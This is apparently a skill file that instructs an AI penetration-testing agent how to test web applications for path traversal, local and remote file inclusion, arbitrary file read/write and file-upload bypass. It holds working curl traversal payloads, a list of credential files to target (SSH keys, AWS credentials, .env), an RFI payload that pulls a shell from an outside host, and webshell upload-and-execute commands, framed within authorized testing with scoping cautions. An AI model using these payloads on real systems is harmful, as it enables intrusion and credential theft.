---
name: web-file-path
description: Use when a param names a file/path or an endpoint accepts uploads — path traversal, LFI/RFI, arbitrary read/write, and upload bypass. Classes traversal/upload.
---

# Path traversal, LFI/RFI & file upload

Two related sinks: params that resolve to a filesystem path (`traversal`, WSTG-ATHZ-01 · CWE-22 · OWASP A01:2021) and endpoints that accept files (`upload`, WSTG-BUSL-09 · CWE-434). Prove with a benign read (e.g. `/etc/passwd`, `C:\windows\win.ini`, `web.config`) — do not overwrite or delete server files, and do not plant a live webshell on a production target without engagement approval.

Per candidate: `record kind=hypothesis ... class=traversal|upload outcome=testing`. **Run every path-ish param and every upload field through this class** — traversal hides in headers, cookies, and JSON too, not just `?file=`. A sink you can't prove or disprove is `outcome=inconclusive` (surfaced by `recall gaps`), never silently dropped.

## Path traversal / LFI (class=traversal · CWE-22)
Sinks (enumerate all): `file=`, `path=`, `page=`, `template=`, `download=`, `include=`, `require=`, `lang=`, `locale=`, `doc=`, `folder=`, `dir=`, `pdf=`, `img=`/image & attachment fetchers, `theme=`/`skin=`, `view=`, `cat=`, `action=`, `filename` in multipart/`Content-Disposition`, and path values inside cookies/headers/JSON.
```bash
curl -s "https://TARGET/download?file=../../../../etc/passwd"           # linux
curl -s "https://TARGET/download?file=..%2f..%2f..%2fetc%2fpasswd"      # url-encoded
curl -s "https://TARGET/download?file=....//....//etc/passwd"           # nested (defeats one-pass ../ strip)
curl -s "https://TARGET/page?file=..%252f..%252fetc%252fpasswd"         # double-encoded
curl -s "https://TARGET/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"   # encoded dots
curl -s "https://TARGET/download?file=/etc/passwd"                       # absolute (no traversal needed)
# windows: ..\..\..\windows\win.ini  |  utf-8 overlong: %c0%ae%c0%ae%c0%af  |  null/truncation: ...%00.png (legacy PHP<5.3, older parsers)
```
- Try each: url-encode, double-encode, nested `....//`, backslashes, absolute paths, leading-slash strip, `%00` null (legacy), overlong UTF-8, and prefix/extension bypass (`file=../../etc/passwd%00.png`, appended-extension defeat).
- Confirm: the response **contains file content** (`root:x:0:0` for passwd, `[extensions]` for win.ini), not just a 200.
- High-value reads: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/proc/self/cmdline`, app source, `.env`, `config.php`, `web.config`, `appsettings.json`, `~/.aws/credentials`, `~/.ssh/id_rsa`, cloud creds, framework secrets.
- PHP wrappers for LFI→source disclosure / RCE: `php://filter/convert.base64-encode/resource=index.php`, `php://filter/read=string.rot13/...`, `data://`, `expect://`, log poisoning (access/error/SSH logs → `/proc/self/environ`), session-file inclusion.
- **RFI** (CWE-98): `?page=http://OOB_HOST/shell.txt` — confirm with an OOB fetch (rare; needs `allow_url_include`). Also try `\\attacker\share` (Windows UNC).

## Arbitrary file read/write
- Read: any traversal that reaches app config/secrets (`.env`, `config.php`, cloud creds, `id_rsa`) → high/critical; record the secret as `loot`.
- Write: upload/move/rename/log/backup that lets you place a file in a web-served or startup path → potential RCE (zip-slip, `filename=../` on write, symlink extraction).

## File upload bypass (class=upload · WSTG-BUSL-08/09 · CWE-434)
Layered checks; bypass each layer (try them all):
1. **Extension:** `shell.php`, then `.phtml/.php3/.php4/.php5/.php7/.pht/.phar/.pgif`, `.asp/.aspx/.cer/.asa`, `.jsp/.jspx`, double `shell.php.jpg`, trailing dot/space `shell.php.`/`shell.php%20`, case `shell.PHp`, null `shell.php%00.jpg`, right-to-left/unicode tricks, `.htaccess`/`web.config`/`.user.ini` to reinterpret an allowed extension.
2. **Content-Type:** send `image/png`/`image/jpeg` while body is code; also flip it the other way if the filter keys on it.
3. **Magic bytes / content sniffing:** prepend `GIF89a;` or a valid PNG/JPEG (`FF D8 FF`) header, then payload — beats signature checks; EXIF-comment payloads for polyglots.
```bash
curl -s -F 'file=@shell.php;type=image/png' https://TARGET/upload -b 'session=<auth>'
# then locate & fetch it back and prove execution:
curl -s "https://TARGET/uploads/shell.php?cmd=id"
```
4. **SVG/XML uploads** → stored XSS or XXE (SVG is XML — see web-xxe): `<svg><script>...</script></svg>` or an external-entity DOCTYPE.
5. **Path in filename:** `filename="../../avatar.php"` → traversal-on-write (place outside the intended upload dir / into webroot).
6. **Polyglots / parser sinks:** ImageMagick (ImageTragick / MSL), ffmpeg (SSRF/read via HLS), PDF/office converters, zip-slip in archive extractors, pixel-flood/decompression bombs (DoS — only if authorized).

## Confirm vs false positive (calibrate, don't discard)
- A generic 200 / echoed filename is not proof — but keep it as a live lead. Require: leaked file *contents* (traversal), or the uploaded handler *executing* / being served with a dangerous content-type (upload). Fetch the file back and prove behavior.
- Upload accepted but you can't yet locate/execute it → `outcome=inconclusive` (route via `recall gaps`), not refuted — the storage path may just be unknown.
- Prefer a harmless webshell that only runs `id`/`whoami`; remove any artifact you plant and note it. For an unapproved intrusive step, `record kind=blocker blockerType=approval`.

## Wire into the loop
```
record kind=hypothesis statement="file= param reads outside webroot" target=e4 class=traversal approach="../../etc/passwd, url-encoded" outcome=confirmed evidence=evidence/lfi-passwd.txt
record kind=finding title="Path traversal reads arbitrary files via /download?file" severity=high target=e4 class=traversal cwe=CWE-22 status=confirmed hypothesisId=y2 evidence=["evidence/lfi-passwd.txt"]
record kind=finding title="Unrestricted upload -> RCE via .phtml webshell" severity=critical target=e_upload class=upload cwe=CWE-434 status=confirmed hypothesisId=y3
```
Severity: upload→RCE / arbitrary write = critical; arbitrary read of secrets = high; traversal of non-sensitive files = medium.

## References
- OWASP WSTG — Testing Directory Traversal File Include — WSTG-ATHZ-01 — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
- OWASP WSTG — Test Upload of Malicious Files — WSTG-BUSL-09 — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
- MITRE CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') — https://cwe.mitre.org/data/definitions/22.html
- MITRE CWE-434: Unrestricted Upload of File with Dangerous Type — https://cwe.mitre.org/data/definitions/434.html
- MITRE CWE-98: PHP Remote File Inclusion — https://cwe.mitre.org/data/definitions/98.html
- OWASP Cheat Sheet — File Upload — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger Web Security Academy — Path traversal — https://portswigger.net/web-security/file-path-traversal
- PortSwigger Web Security Academy — File uploads — https://portswigger.net/web-security/file-upload
